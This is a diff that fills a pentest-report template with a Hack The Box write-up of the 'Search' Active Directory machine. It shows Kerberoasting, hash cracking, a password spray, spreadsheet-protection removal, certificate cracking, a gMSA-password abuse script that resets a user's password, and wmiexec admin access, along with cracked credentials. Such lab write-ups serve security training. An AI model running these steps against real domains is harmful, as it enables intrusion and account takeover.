@@ -482,25 +482,446 @@ Nmap done: 1 IP address (1 host up) scanned in 105.78 seconds
            Raw packets sent: 104 (8.284KB) | Rcvd: 52 (2.872KB)
 ```
 
-_Initial Shell_
+_Initial Shell - PowerShell Web Access_
 
-_Additional info about where the initial shell was acquired from_
+Viewing the landing page on the web server port 80
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption><p>Landing Page</p></figcaption></figure>
+
+Scoping the website I see an interesting image&#x20;
+
+<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+
+Zooming into this image it appears to show names and a password
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption><p>Names and Passwords</p></figcaption></figure>
+
+I attempt to use a common naming scheme as the username and the presented password. The credentials were correct and shares were revealed.
+
+```
+┌──[Fri Nov 11 11:44:11 AM CST 2022]-[TheScriptKid]-[/home/pentester]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# cme smb $ip -u 'hope.sharp' -p 'IsolationIsKey?' --shares      
+SMB         10.129.227.156  445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
+SMB         10.129.227.156  445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
+SMB         10.129.227.156  445    RESEARCH         [+] Enumerated shares
+SMB         10.129.227.156  445    RESEARCH         Share           Permissions     Remark
+SMB         10.129.227.156  445    RESEARCH         -----           -----------     ------
+SMB         10.129.227.156  445    RESEARCH         ADMIN$                          Remote Admin
+SMB         10.129.227.156  445    RESEARCH         C$                              Default share
+SMB         10.129.227.156  445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
+SMB         10.129.227.156  445    RESEARCH         helpdesk                        
+SMB         10.129.227.156  445    RESEARCH         IPC$            READ            Remote IPC
+SMB         10.129.227.156  445    RESEARCH         NETLOGON        READ            Logon server share 
+SMB         10.129.227.156  445    RESEARCH         RedirectedFolders$ READ,WRITE      
+SMB         10.129.227.156  445    RESEARCH         SYSVOL          READ            Logon server share
+```
+
+With these credentials I receive a ticket by utilizing the impacket tool GetUserSPNs
+
+{% code overflow="wrap" %}
+```
+┌──[Fri Nov 11 11:56:28 AM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# python3 /usr/local/bin/GetUserSPNs.py search.htb/hope.sharp:'IsolationIsKey?' -dc-ip $ip -request 
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
+---------------------------------  -------  --------  --------------------------  --------------------------  ----------
+RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 07:59:11.329031  2022-11-10 22:48:48.982717             
+
+
+
+$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$2dbf6521695c969950df2ee133d844c8$ed48a09645d2d6d59a2772ffb9aac766283b272a740d23e3e3127b652a36b5fe75a83da5f2a539a0ca824882b6b3ec211665daa71d4f03a77c1af5481b101d65f2cf6b505721a4d2ec59c6216374a1888475c6b464749a10ae39c691580469b94b0c470fc208d527b0efa60b60e4fa0802a4953e1a8706e1e7f57e622b48ae9ec05bbbed8fba6b23718fff416734da8421b5cfec080f7d0ed3b36f45b5ed25183e9a41ba088a07857a4ec011086fda8ed49492bc26397017dbea7a69ec3791f3b3b5bab0d1299408d2f43bc965446a43baa9c1d01ceb64bb527a1fced6357b5c658a34675870674a410e16f7211118e9970713e18c89669303c8f345d26824fcf89f87d1b48fb8f47c82dc9b7c9213e5f259c30d5b759add6debed4218dd56fab20900893b21e44d5fb3482c8529b1c92d9b7a6e58768af677af3336b3899c4bf4a536905246f48f4b524c14353cfc6bb5de2a7db725f29866213c3449fdd02d561ab45017b70207d4b4820e40198564c675af77654e360248848137daef01dbe34972f4ad6b45e52d2fed7f9f43f23e059999957efd841e313367ee188f25c33dd5827e7be7627892a21fb0b3cd9d17ac7919c91ca2f8b6b72adfc5fb7e2299a177d61e3e171f6e7369619fb6bbffb592eacd854413e7ed6fb470acc908a69ab6c2f31f1a4d649334d1c72c8b78ddedf691f3e3576dd5d7ce723f38488ebe342653708bce9659c7887e4e63775f989b37f81709e67e617e9db20ca92821cbaabca451981fcc4227f64797d4fdaf91e23c5abd9b931f5146daf783a61f9e76a6cddc196450703c72434daf67c69fce3c953216b050eb93cdc93c67a199470bf3414f5acd5fe20d300ddc29a7a9433ac6548d7e8404ccafb6853cc5af6601f0b08230c176c584492778e5e3fcdb4020e3962e9d4d67fea5fefa611a801bd8e9566ea9a8d995c1ac2c9869c5b444ec7c94fe17b16ce85e3f9594e2df6f665842b0ffe506a2b63fd33b5483ed1f69889aa51610963b995ae824089717f20837ae063bd7b4ee8375fa3ecd0ebc7720d796e2d28254bf383a3d5c89173da1e787b001d1944e12fab3c76f6a0b101f478c9ccb29b0801466e182627b1fc66f1878c4a198c8b9e8f52a2104f38290800209615558d917eebab3a1fb401a6c32db57875d8bda00388fa5a2f107a7d43f24d0bf71abf436f7110fb8560272f13e2db3cff426f267575ca846e9651fc352992ea050d4ef718e796f8eb85131b6b87d9536f35a466cc3d4021e5246ea0e7a1e8d0958cd03a3b6ca76b3660ff8ea3bd3d612fd507c0b81145ac9efd58930573b6dd0a0a167b754e91769496dd7d7bd95a923a8e29655babd54b0c26c78f2d67a228fcff1ce17133a474431d00c45aa29a89022f30ef5444b747b6e49c1e47f72b8534ef24ac01f514d26753872700be492601d4ec3c7c38958c8be73314c1d40ac9a2a35b149888d
+```
+{% endcode %}
+
+Using hashcat the ticket was cracked
+
+{% code overflow="wrap" %}
+```
+┌──[Fri Nov 11 12:03:45 PM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# hashcat -d 2 web_svc.txt -m 13100 -a 0 /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.5-579-g634b43e62) starting
+...
+b8560272f13e2db3cff426f267575ca846e9651fc352992ea050d4ef718e796f8eb85131b6b87d9536f35a466cc3d4021e5246ea0e7a1e8d0958cd03a3b6ca76b3660ff8ea3bd3d612fd507c0b81145ac9efd58930573b6dd0a0a167b754e91769496dd7d7bd95a923a8e29655babd54b0c26c78f2d67a228fcff1ce17133a474431d00c45aa29a89022f30ef5444b747b6e49c1e47f72b8534ef24ac01f514d26753872700be492601d4ec3c7c38958c8be73314c1d40ac9a2a35b149888d:@3ONEmillionbaby
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*...49888d
+```
+{% endcode %}
+
+I grab domain information with new set of credentials and parse the generated json files for usernames
+
+```
+┌──[Fri Nov 11 12:16:46 PM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# bloodhound-python -u 'web_svc' -p '@3ONEmillionbaby'  -d search.htb -ns $ip -c all       
+INFO: Found AD domain: search.htb
+INFO: Connecting to LDAP server: research.search.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 113 computers
+INFO: Connecting to LDAP server: research.search.htb
+INFO: Found 107 users
+INFO: Found 64 groups
+INFO: Found 0 trusts
+...
+```
+
+{% code overflow="wrap" %}
+```
+┌──[Fri Nov 11 12:19:51 PM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# cat *_users.json| jq .data[].Properties.name | cut -d '"' -f2 | cut -d "@" -f1 > users.txt
+```
+{% endcode %}
+
+I proceed to passwordspray against the compiles usernames and see that edgar.jacobs is also using the web\_svc password
+
+```
+┌──[Fri Nov 11 12:21:56 PM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# kerbrute passwordspray -d search.htb --dc $ip users.txt '@3ONEmillionbaby'                                                                            1 ⨯
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 11/11/22 - Ronnie Flathers @ropnop
+
+2022/11/11 12:22:40 >  Using KDC(s):
+2022/11/11 12:22:40 >  	10.129.227.156:88
+
+2022/11/11 12:22:41 >  [+] VALID LOGIN:	 WEB_SVC@search.htb:@3ONEmillionbaby
+2022/11/11 12:22:43 >  [+] VALID LOGIN:	 EDGAR.JACOBS@search.htb:@3ONEmillionbaby
+2022/11/11 12:22:44 >  Done! Tested 107 logins (2 successes) in 3.650 seconds
+```
+
+With SMB open I proceed to scope edgar's share and find a file of interest in his desktop folder
+
+```
+┌──[Fri Nov 11 12:26:13 PM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# smbclient //$ip/RedirectedFolders$ -U edgar.jacobs                                                                                                    1 ⨯
+Password for [WORKGROUP\edgar.jacobs]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  ...
+  edgar.jacobs                       Dc        0  Thu Apr  9 15:04:11 2020
+  ...
+
+		3246079 blocks of size 4096. 672051 blocks available
+smb: \> cd edgar.jacobs
+smb: \edgar.jacobs\> ls
+  .                                  Dc        0  Thu Apr  9 15:04:11 2020
+  ..                                 Dc        0  Thu Apr  9 15:04:11 2020
+  Desktop                           DRc        0  Mon Aug 10 05:02:16 2020
+  Documents                         DRc        0  Mon Aug 10 05:02:17 2020
+  Downloads                         DRc        0  Mon Aug 10 05:02:17 2020
+
+		3246079 blocks of size 4096. 672051 blocks available
+smb: \edgar.jacobs\> cd Desktop
+smb: \edgar.jacobs\Desktop\> ls
+  .                                 DRc        0  Mon Aug 10 05:02:16 2020
+  ..                                DRc        0  Mon Aug 10 05:02:16 2020
+  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 15:05:29 2020
+  desktop.ini                      AHSc      282  Mon Aug 10 05:02:16 2020
+  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 15:05:03 2020
+  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 05:35:44 2020
+
+		3246079 blocks of size 4096. 672051 blocks available
+smb: \edgar.jacobs\Desktop\> get Phishing_Attempt.xlsx
+getting file \edgar.jacobs\Desktop\Phishing_Attempt.xlsx of size 23130 as Phishing_Attempt.xlsx (13.9 KiloBytes/sec) (average 13.9 KiloBytes/sec)
+```
+
+Opening the file with libreoffice I can see there is a password protected sheet that can be easily bypassed.
+
+<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption><p>Password Icon and hidden C column</p></figcaption></figure>
+
+Unzipping the xlsx file allows me to view the password protected sheet's xml markup and to remove the sheetprotection tag using any text editor.&#x20;
+
+```
+┌──[Fri Nov 11 12:33:41 PM CST 2022]-[TheScriptKid]-[/tmp/sheet]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# unzip Phishing_Attempt.xlsx        
+Archive:  Phishing_Attempt.xlsx
+  inflating: [Content_Types].xml     
+  inflating: _rels/.rels             
+  inflating: xl/workbook.xml         
+  inflating: xl/_rels/workbook.xml.rels  
+  inflating: xl/worksheets/sheet1.xml  
+  inflating: xl/worksheets/sheet2.xml  
+  inflating: xl/theme/theme1.xml     
+  inflating: xl/styles.xml           
+  inflating: xl/sharedStrings.xml    
+  inflating: xl/drawings/drawing1.xml  
+  inflating: xl/charts/chart1.xml    
+  inflating: xl/charts/style1.xml    
+  inflating: xl/charts/colors1.xml   
+  inflating: xl/worksheets/_rels/sheet1.xml.rels  
+  inflating: xl/worksheets/_rels/sheet2.xml.rels  
+  inflating: xl/drawings/_rels/drawing1.xml.rels  
+  inflating: xl/charts/_rels/chart1.xml.rels  
+  inflating: xl/printerSettings/printerSettings1.bin  
+  inflating: xl/printerSettings/printerSettings2.bin  
+  inflating: xl/calcChain.xml        
+  inflating: docProps/core.xml       
+  inflating: docProps/app.xml        
+                                                                                                                                                               
+┌──[Fri Nov 11 12:33:49 PM CST 2022]-[TheScriptKid]-[/tmp/sheet]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# vim xl/worksheets/sheet2.xml 
+```
+
+{% code overflow="wrap" %}
+```
+<sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg==" saltValue="U9oZfaVCkz5jWdhs9AA8nA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
+```
+{% endcode %}
+
+```
+┌──[Fri Nov 11 12:40:57 PM CST 2022]-[TheScriptKid]-[/tmp/sheet]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# rm Phishing_Attempt.xlsx 
+                                                                                                           
+┌──[Fri Nov 11 12:45:35 PM CST 2022]-[TheScriptKid]-[/tmp/sheet]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# zip -fr Phishing_Attempt.xlsx *                                                                                                                      12 ⨯
+freshening: xl/worksheets/sheet2.xml (deflated 73%)
+```
+
+Reopening the file shows the hidden column in the sheet revealing passwords
+
+<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption><p>Unprotected Sheet</p></figcaption></figure>
+
+```
+┌──[Fri Nov 11 12:50:44 PM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# cme smb $ip -u users.txt -p passwords.txt
+...
+SMB         10.129.227.156  445    RESEARCH         [+] search.htb\SIERRA.FRYE:$$49=wide=STRAIGHT=jordan=28$$18
+```
+
+Using this information I begin to search for valid credentials and see that user sierra.frye is valid
+
+I login as sierra.frye and being to search for files. Finding two files of interest I download the files.
+
+```
+┌──[Fri Nov 11 12:55:41 PM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# smbclient //$ip/RedirectedFolders$ -U sierra.frye 
+Password for [WORKGROUP\sierra.frye]:
+Try "help" to get a list of possible commands.
+smb: \> cd sierra.frye
+smb: \sierra.frye\> ls
+  .                                  Dc        0  Wed Nov 17 19:01:46 2021
+  ..                                 Dc        0  Wed Nov 17 19:01:46 2021
+  Desktop                           DRc        0  Wed Nov 17 19:08:00 2021
+  Documents                         DRc        0  Fri Jul 31 09:42:19 2020
+  Downloads                         DRc        0  Fri Jul 31 09:45:36 2020
+  user.txt                          ARc       34  Thu Nov 10 18:59:48 2022
+
+		3246079 blocks of size 4096. 671885 blocks available
+smb: \sierra.frye\> get user.txt
+getting file \sierra.frye\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \sierra.frye\> cd downloads
+smb: \sierra.frye\downloads\> ls
+  .                                 DRc        0  Fri Jul 31 09:45:36 2020
+  ..                                DRc        0  Fri Jul 31 09:45:36 2020
+  $RECYCLE.BIN                     DHSc        0  Tue Apr  7 13:04:01 2020
+  Backups                           DHc        0  Mon Aug 10 15:39:17 2020
+  desktop.ini                      AHSc      282  Fri Jul 31 09:42:18 2020
+
+		3246079 blocks of size 4096. 671885 blocks available
+smb: \sierra.frye\downloads\> cd backups
+smb: \sierra.frye\downloads\backups\> ls
+  .                                 DHc        0  Mon Aug 10 15:39:17 2020
+  ..                                DHc        0  Mon Aug 10 15:39:17 2020
+  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 10:04:11 2020
+  staff.pfx                          Ac     4326  Mon Aug 10 15:39:17 2020
+
+		3246079 blocks of size 4096. 671885 blocks available
+smb: \sierra.frye\downloads\backups\> get staff.pfx
+getting file \sierra.frye\downloads\backups\staff.pfx of size 4326 as staff.pfx (10.6 KiloBytes/sec) (average 5.4 KiloBytes/sec)
+```
+
+The staff.pfx file appears to be a password protected certificate
+
+<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+
+Using a tool called crackpks12 I begin to bruteforce and crack the password
+
+```
+┌──[Fri Nov 11 01:07:04 PM CST 2022]-[TheScriptKid]-[/root]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# crackpkcs12 /tmp/staff.pfx -d /usr/share/wordlists/rockyou.txt                                                                                      100 ⨯
+
+Dictionary attack - Starting 8 threads
+
+*********************************************************
+Dictionary attack - Thread 1 - Password found: misspissy
+*********************************************************
+
+
+```
+
+Certificate files are commonly used for web servers. I begin to enumerate directories to see where can I use the certificate and notice a staff directory
+
+```
+┌──[Fri Nov 11 01:36:59 PM CST 2022]-[TheScriptKid]-[/home/pentester]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://$ip/FUZZ/ -fc 404                    130 ⨯ 1 ⚙
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.227.156/FUZZ/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response status: 404
+________________________________________________
+
+css                     [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 163ms]
+images                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 163ms]
+js                      [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 334ms]
+fonts                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 56ms]
+staff                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 59ms]
+```
+
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption><p>Selecting the certificate</p></figcaption></figure>
+
+I view the staff directory and select the certificate which brings me to a Windows PowerShell Web Access login page
+
+<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption><p>Windows PowerShell Web Access</p></figcaption></figure>
+
+I use sierra's credentials and specify localhost to login and gain access
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>Logging In</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption><p>Inital Foothold</p></figcaption></figure>
 
 **Vulnerability Explanation:**
 
 **Vulnerability Fix:**
 
-**Severity:**
+**Severity: Critical**
 
 **Proof of Concept Code Here:**
 
 **Local.txt Proof Screenshot**
 
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
 **Local.txt Contents**
+
+```
+PS C:\users\sierra.frye\desktop> 
+hostname; whoami; type user.txt; ipconfig /all
+ 
+Windows IP Configuration
+ 
+   Host Name . . . . . . . . . . . . : Research
+   Primary Dns Suffix  . . . . . . . : search.htb
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : search.htb
+                                       htb
+ 
+Ethernet adapter Ethernet0 2:
+ 
+   Connection-specific DNS Suffix  . : .htb
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-B9-4E-F1
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   IPv6 Address. . . . . . . . . . . : dead:beef::ce(Preferred) 
+   Lease Obtained. . . . . . . . . . : 11 November 2022 00:58:49
+   Lease Expires . . . . . . . . . . : 11 November 2022 20:58:50
+   IPv6 Address. . . . . . . . . . . : dead:beef::e5e3:b96e:4a37:5a02(Preferred) 
+   Link-local IPv6 Address . . . . . : fe80::e5e3:b96e:4a37:5a02%6(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 10.129.227.156(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Lease Obtained. . . . . . . . . . : 11 November 2022 00:58:32
+   Lease Expires . . . . . . . . . . : 11 November 2022 20:59:11
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%6
+                                       10.129.0.1
+   DHCP Server . . . . . . . . . . . : 10.129.0.1
+   DHCPv6 IAID . . . . . . . . . . . : 117461078
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-24-23-32-00-50-56-B9-CF-AF
+   DNS Servers . . . . . . . . . . . : 127.0.0.1
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+   Connection-specific DNS Suffix Search List :
+                                       htb
+PS C:\users\sierra.frye\desktop>
+```
+
+```
+Research
+search\sierra.frye
+PS C:\users\sierra.frye\desktop> 
+whoami
+search\sierra.frye
+search\sierra.frye
+```
+
+```
+cat user.txt
+e3a4149a6c84118bcc4085fe8facc5b0
+search\sierra.frye
+PS C:\users\sierra.frye\desktop> 
+```
 
 **Privilege Escalation**
 
-_Additional Priv Esc info_
+With our previous information found with bloodhound sierra.fry has readgmsapassword which can be easily abused by the following
+
+```
+PS C:\users\sierra.frye\desktop> 
+$gmsa = Get-ADServiceAccount -Identity bir-adfs-gmsa -Properties 'msds-managedpassword'
+$mp = $gmsa.'msds-managedpassword'
+$mp1 = ConvertFrom-ADManagedPasswordBlob $mp 
+$user = 'BIR-ADFS-GMSA$' 
+$passwd = $mp1.'CurrentPassword'
+$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
+$cred = new-object system.management.automation.PSCredential $user,$secpass
+Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword
+ (ConvertTo-SecureString -AsPlainText 'Password1234!' -force)} -Credential $cred
+search\sierra.frye
+PS C:\users\sierra.frye\desktop>
+```
+
+Using wmiexec we gain administrative access
+
+```
+┌──[Fri Nov 11 02:38:33 PM CST 2022]-[TheScriptKid]-[/root]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
+└──# wmiexec.py search/tristan.davies:'Password1234!'@$ip                                                                                                  1 ⨯
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>
+```
 
 **Vulnerability Exploited:**
 
@@ -512,9 +933,66 @@ _Additional Priv Esc info_
 
 **Exploit Code:**
 
-**Proof Screenshot Here:**
+**root Screenshot Here**
 
-**Proof.txt Contents:**
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption><p>Root.txt</p></figcaption></figure>
+
+**root.txt Contents**
+
+```
+C:\users\administrator\desktop>hostname
+Research
+
+C:\users\administrator\desktop>whoami
+search\tristan.davies
+
+C:\users\administrator\desktop>type root.txt
+d2fb84163f6279e4cba7cd697bc00992
+
+C:\users\administrator\desktop>ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : Research
+   Primary Dns Suffix  . . . . . . . : search.htb
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : search.htb
+                                       htb
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-B9-4E-F1
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   IPv6 Address. . . . . . . . . . . : dead:beef::ce(Preferred) 
+   Lease Obtained. . . . . . . . . . : 11 November 2022 00:58:49
+   Lease Expires . . . . . . . . . . : 11 November 2022 21:28:50
+   IPv6 Address. . . . . . . . . . . : dead:beef::e5e3:b96e:4a37:5a02(Preferred) 
+   Link-local IPv6 Address . . . . . : fe80::e5e3:b96e:4a37:5a02%6(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 10.129.227.156(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Lease Obtained. . . . . . . . . . : 11 November 2022 00:58:32
+   Lease Expires . . . . . . . . . . : 11 November 2022 21:29:12
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%6
+                                       10.129.0.1
+   DHCP Server . . . . . . . . . . . : 10.129.0.1
+   DHCPv6 IAID . . . . . . . . . . . : 117461078
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-24-23-32-00-50-56-B9-CF-AF
+   DNS Servers . . . . . . . . . . . : 127.0.0.1
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+   Connection-specific DNS Suffix Search List :
+                                       htb
+
+C:\users\administrator\desktop>
+```
+
+#### Badge
+
+<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
 **Post Exploitation**
 
@@ -536,8 +1014,6 @@ After collecting data from the network was completed, I removed all user account
 | ------------- | ------------------ | ------------------ |
 | x.x.x.x       | hash\_here         | hash\_here         |
 
-### Appendix - Metasploit/Meterpreter Usage
+### Appendix -&#x20;
 
-For the pentest, I used my Metasploit/Meterpreter allowance on the following machine: `No Metasploit/Meterpreter was used during engagment`
-
-### Appendix - Completed Buffer Overflow Code
+### Appendix -
